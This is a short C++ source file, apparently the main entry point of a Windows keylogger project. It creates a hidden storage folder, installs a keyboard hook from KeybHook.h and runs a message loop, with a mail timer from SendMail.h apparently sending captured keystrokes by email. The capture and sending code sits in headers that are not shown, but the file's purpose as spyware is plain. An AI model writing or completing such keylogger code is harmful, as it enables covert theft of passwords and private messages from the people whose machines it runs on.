#include <iostream>

#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "Timer.h"
#include "IO.h"
#include "SendMail.h"
#include "KeybHook.h"
using namespace std;

int main()
{
    MSG msg;
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();
	while(GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	MailTimer.Stop();
    return 0;
}
